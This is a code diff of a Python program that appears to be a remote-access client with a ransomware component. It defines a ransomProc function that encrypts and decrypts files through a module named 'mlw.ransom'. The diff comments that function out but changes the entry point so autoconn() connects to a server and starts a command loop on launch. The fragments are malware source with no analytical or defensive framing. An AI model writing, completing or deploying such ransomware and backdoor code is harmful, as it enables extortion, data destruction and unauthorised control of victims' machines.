@@ -4,7 +4,7 @@ import subprocess
 import sys
 import time
 
-import mlw.ransom as ransom
+# import mlw.ransom as ransom
 
 
 # SERVER_HOST = "127.0.0.1"
@@ -31,16 +31,17 @@ def autoconn():
     cmds(s)
     
 def ransomProc(cmd):
-    output = ""
-    if cmd[0].lower() == "e":
-        key, salt = ransom.generate_key(cmd[2])
-        output = ransom.enc_det(cmd[1], key)
-    elif cmd[0].lower() == "d":
-        key, salt = ransom.generate_key(cmd[2], load_existing_salt=True)
-        output = ransom.dec_det(cmd[1], key)
-    else:
-        pass
-    return output
+    # output = ""
+    # if cmd[0].lower() == "e":
+    #     key, salt = ransom.generate_key(cmd[2])
+    #     output = ransom.enc_det(cmd[1], key)
+    # elif cmd[0].lower() == "d":
+    #     key, salt = ransom.generate_key(cmd[2], load_existing_salt=True)
+    #     output = ransom.dec_det(cmd[1], key)
+    # else:
+    #     pass
+    # return output
+    pass
 
 def cmds(s):
     term = False
@@ -79,4 +80,4 @@ def cmds(s):
     else: os._exit(1)
 
 if __name__ == '__main__':
-    pass
+    autoconn()
